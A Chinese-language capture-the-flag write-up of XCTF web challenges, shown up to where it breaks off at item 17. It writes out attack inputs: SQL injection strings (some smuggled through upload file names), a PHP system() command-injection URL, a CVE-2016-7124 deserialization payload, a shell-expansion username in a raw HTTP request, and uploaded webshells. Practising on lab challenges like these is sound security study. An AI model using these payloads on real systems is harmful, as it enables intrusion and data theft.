---
title: XCTF - 部分WP
date: 2019-02-16 19:41:43
tags:
	- CTF
	- WP
categories: CTF
thumbnail: /img/1484628411610.jpg

---


# XCTF


### <b>0x00\- \- 前言</b>  

找到这个地方也是几经周折...发现自己错过了Hgame...然后不甘心的一顿搜索，结果撞到这个地方。  
不说了，刷起。

### <b>0x01\- \- Web</b>

#### <font color = "blue">level.1\-\-新手练习</font><br>

<b>01-view_source</b>

题目提示使用view_source来查看源码。直接查看即可得到flag。
F12效果相同

<b>02-get_post</b>

第一步提示get发送一个a=1
第二步提示post发送一个b=2
hackbar发送得到flag。

<b>03-robots</b>

Robots协议，联想到robots.txt
查看robots.txt得到hint:flag_1s_h3re.php，访问得到flag。

<b>04-backup</b>

打开页面得到提示：你知道index.php的备份文件名吗？
备份文件名为index.php.bak,下载保存，查看源码得到flag。

<b>05-cookie</b>

题目提示很到位，直接查看请求包cookie得到hint:cookie.php。
访问得到下一个hint：http_response。
查看响应包得到flag。

<b>06-disabled_button</b>

前端问题，F12修改前端代码之后点击即可。
也可以直接构造请求包。

<b>07-simple_js</b>

js问题，访问之后是一个js窗要求输入密码
查看源码，观察js代码。
可以写出解密python脚本：
对实际password直接输出得到ascii码值，输出其ascii码即是Flag。

<b>08-xff_referer</b>

提示伪造xff和referer。
伪造即可得到flag。
浏览器修改的话回音藏到后面，F12查看源码。

<b>09-weak_auth</b>

尝试登陆，提示密码错误，你可能需要一个字典。
弱密码爆破得到flag。
这里看教程拿到了一个字典库：
[字典](https://github.com/rootphantomer/Blasting_dictionary)

<b>010-webshell</b>

一句话木马，菜刀连一下。
直接看到flag.txt。得到flag

<b>011-command_execution</b>

命令注入，相当于DVWA的Low level。
cat /home flag.txt

<b>012-simple_php</b>

阅读php代码按要求输入即可...
a:科学计数法绕过。
b:%00截断。

#### <font color = "blue">level.2\-\-萌新入坑</font><br>

<b>01-upload</b>

打开是一个文件上传窗，随便上传一个发现回显路径;访问路径成功。
尝试上传一句话木马：提示只能上传jpg，但是文件栏成功显示一句话木马文件，只是上传按钮变灰。
联想到了是前端的过滤，禁用JS进行尝试。
成功上传一句话木马，菜刀连接。得到flag。

<b>02-NewsCenter</b>

发现存在post注入点。
手动注入：
`1' order by 3# ` 存在3列

`1' union select 1,2,3` 查看回显位置

`1' union select 1,2,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA#`或者`1' union select 1,2,schema_name from information_schema.schemata#`查看存在哪些数据库。

`1' union select 1,2,user()#`查看用户。

`1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='news'#`查看new内有哪些表单。

`1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='secret_table'#`查看sercet_table下的列名。

`1' union select 1,2,fl4g from secret_table#`查询数据得到flag。

>自己手动注入那叫一个差劲啊

<b>03-Training-Get-Resourced</b>

题目描述不让看注释，就去看看注释
啊，有了...(这难度星级是随便打的嘛...)

<b>04-Triangle</b>

没有任何提示，先打开看看。
一个要求输入Flag的页面。
看到了后面的js脚本。。。
ok，不会，看题解了。
这是一道JS逆向题...
console可以看到关键的三个函数。。。
题目解释说是unicorn.js的一个ARM仿真加密，需要IDE逆向...

<b>05-mfw</b>

首先发现了注释：my secret，而url仿佛存在任意文件访问漏洞。然而尝试后发现会有detect保护。
继续查看剩下的页面，发现组成部分中包含：GIT
难道是git泄露？
ok,发现.git文件目录。学习了gitTools使用方法，下载到了源码。
看到index.php内存在一个这样的语句

`$file = "templates/" . $page . ".php";`

这里存在着任意命令执行漏洞。

构造`111.198.29.45:31701/index.php?page=%27.system("cd%20../../../;%20ls%20-lA;").%27about`

这里大神还给出了一个小技巧，使用view-source可以格式化查看结果。
查看flag.php，得到flag
这里我完全是瞎猫碰死耗子。。。大佬解释了为什么.git内不存在flag内容而通过上述操作的就存在答案。因为对git的命令和原理根本不熟悉。

大佬重审了git下载的库,发现主机内的flag.php文件被修改，但是还没有提交，使用`git diff`命令进行对比，得到了flag...

>follow the master,（跟随大师，）
>
>and walk with the master,（与大师通行，）
>
>新增支线任务：学习git

<b>06-ics-06</b>

以为又是注入...结果发现根本不是一个注入点。
后来想了想题面提示，只有一个。
...不会让我爆破id把。。。
然后测了一下id=9999999都不报错....
行吧，爆破下把。
OK,2333
的确是送分题，感觉很恶心。。。（如果我爆破只跑了2222怎么办？）

<b>07-upload</b>

看题目意思应该是一个上传题目。
测试一下，发现只能够上传jpg图片文件。
行吧，卡住了，找大佬去了。
然后说这是一个注入题。。。文件名的二次注入(这谁扛得住啊...)
先去默默地了解下二次注入...(sqliab)
二次注入的思路是先将脏数据存入到数据库中，再取出的过程中完成对Sql语句的污染。
。。。二次注入的大佬思路没看懂...这里使用了另一个大佬的盲注,通过insert注入回显。：

`1' & (( seleselectct count(table_name) frfromom information_schema.tables where table_schema=database())=1)& '1.jpg"` 

获取表的数量

`filename="1' & (sselectelect (seselectlect length(table_name) frofromm information_schema.tables where table_schema=database() limit 0,1)>8)& '1.jpg"`

获取表的长度

`filename="1' & (ascii(substr((selselectect table_name frfromom information_schema.tables where table_schema=database() limit 0,1) ,1,1)) > 100 )& '1.jpg"`

获取表的名称

的确是一个可行的方案，但是这个原题目应该有验证码的，所以盲注需要时间太长了。
再看大佬的大佬的注入方法：

`‘+concat((selselectect version()))+’.jpg` 

查看mysql 版本，返回 5.6

`‘+concat((selselectect length(database())))+’.jpg ` 

查看database长度 返回 10

`‘+concat((selselectect ascii(substr(database(),1,1))))+’.jpg`

查看Database名字 返回 119 以此繼續爆..


`‘+concat((selselectect ascii(substr((selselectect table_name frfromom 
information_schema.tables where table_schema=database() limit 
0,1),1,1))))+’.jpg` 

爆第一个表名 返回 102 以此繼續爆..到第5位

`‘+concat((selselectect ascii(substr((selselectect table_name frfromom 
information_schema.tables where table_schema=database() limit 
1,1),1,1))))+’.jpg` 

爆第二个表名 返回 104 以此繼續爆..到第18位

`‘+concat((selselectect ascii(substr((selselectect column_name frfromom information_schema.columns where table_name=’hello_flag_is_here’ limit 0,1),1,1))))+’.jpg`

爆列名字 返回 105 

以此繼續爆..到第10位

`‘+concat((selselectect ascii(substr((selselectect i_am_flag frfromom 
hello_flag_is_here LIMIT 0,1),1,1))))+’.jpg `

爆数据 返回 33 以此繼續爆..到第16位

跟着这个大佬的思路，总算是做出来了。。。要改一个地方，这个题目过滤了ascii，所以我用了hex来转成16进制输出.

再遇坑点：hex输出时候会吞掉字符只输出数字。

这里感觉对concat的理解还不到位。

再次换方法：放弃concat 使用 conv 对hex 转换成二进制。

一位一位的读出来。得到flag

>好好练习sql注入

<b>08-biscuiti-300</b>

打开发现一个简单的username 和password的登录窗

一个post方法的登录。

尝试注入,但是不管结果是啥返回只有一个error...

扔去暴力破解吧...

ok直接炸出来0的时候admin登陆成功...然并卵啊。

行吧，那就继续研究注入吧。

又是没见过的注入：

`'union select '123','456'--&password=0 ` 
可以用任意用注入。

查看cookie 发现一个base64加密的序列化。

需要将is admin置为1。

这里提到了CBC字节反转攻击...padding oracle

<b>09-unserialize3</b>
题目是一段php，给了一个class，要求用code传输反序列化的字符串。
构造了一个反序列化提交：O:4:"xctf":1:{s:4:"flag";s:3:"111";}，返回bad request。
这里由于class内有__wakeup()函数导致在反序列化时会运行这个函数。
于是题目转变成了魔术函数的绕过：这是一个CVE，漏洞编号CVE-2016-7124
当成员属性数目大于实际数目时可绕过__wakeup()。
修改poc,得到flag。
`O:4:"xctf":2:{s:4:"flag";s:3:"111";}`

<b>10-wtf.sh-150</b>

连接是一个带有注册和登录的论坛界面。
一开始以为是注入...对着测试了一通。。
还是跟着大佬的脚步把、、、
不得不说大佬是真的强：对于注册窗口用户名存xss漏洞都能挖出来...
首先这题存在着源码泄露：wtf.sh可以直接查看源码
查看源码时可以发现存在LFI漏洞，我们需要以管理员身份登陆，并且登录的token 和password在/users目录下
尝试使用LFI漏洞进行访问：../users
得到了众多用户的md5 密文和base64的token
修改cookie和token F5刷新可以看到，我们已经是管理员登录了，在管理page页面内得到了...半句flag(wtf??)
行吧，这种题目水平已经不是我能够做的了，老实的跟着大佬做吧...
继续查看源码...会发现在reply中包含一个可以写入文件的参数、
首先注册用户名为 ${find,/,-iname,get_flag2} 的用户，并以该用户进行提交
`POST /reply.wtf?post=../users_lookup/sh.wtf%09 HTTP/1.1
Host: web.chal.csaw.io:8001
Content-Type: application/x-www-form-urlencoded
Cookie: USERNAME=${find,/,-iname,get_flag2}; TOKEN=Uf7xrOWHXoRzLdVS6drbhjHyIZVsCXFgQYnOG01UhENS1aaajeezaWrgpOno8HBljrHOMmfbQUY+rES1bWlNWQ==
text=asd&submit=`
之后访问我们提交的页面/users_lookup/sh.wtf
可以得到flag2的访问路径。
由此，我们重新构造请求访问Flag2即可。

<b>11-Training-WWW-Robots</b>

题目提示 robots.txt，是一个 robots 泄露。访问提示：/fl0g.php，访问得到flag
。。。题目难度差距有点大。

<b>12-PHP2</b>

有个坑点。。。原题好像有提示说index.phps有源码...
打开查看源码,发现是一个二次url加密绕过...对admin二次加密即可...

<b>13-lottery</b>

这个源码给的就很舒服了，直接就在附件中，先看源码吧。

<b>14-FlatScience</b>

robots.txt给了两个页面的提示，访问login.php存在注释：debug参数
GET debug参数可以查看源码，发现存在注入点。
注入得到cookie提示，密码在他的论文里。
写个脚本跑sha1值得到密码。
登录即可。

注入payload:usr=' union select 1,(select id || '; ' || name || '; ' || password || '; ' || hint from Users limit 1)--&pw=

<b>15-ics-01</b>

题目提示是一个工控系统，寻找入手点。
自己做的时候绕了一大阵子那个上传点，一中午之后愤怒查找题解。。。

结果还是少了几句话的提示原因。。。

首先源码泄露....不知道为什么御剑字典里没有这种类型的测试。

`.index.php.swp`
`.index.php.swo`
`.index.php.swn`

下载到源码swp文件，但是就是怎么都恢复不出来???
行吧，默认当作有源码做了。。。
然后发现可以使用php://input来查看upload.php的源码...



<b>16-NaNNaNNaNNaN-Batman</b>

好的我又开始上提还没做完就来做下一道题了。
这题只有一个附件，给了一个web100的源码。
里面大概是js代码的样子。
熟悉的特殊符号。。。这题好像哪里见到过的样子。但是想不起来怎么处理的了。
估计又是做了一半扔掉了。

OK，老规矩之后，这题学习一下chrome调试大法。
F12 -> source 进入到开发者模式。在eval前加入断点调试。即可得到源码。。
正则表达式构造出密码直接得到flag.

还有好多种骚方法。。。直接代码审计，，，看出flag。
还有大佬把eval()换成alert()....直接弹出来。
dalao tql...

<b>17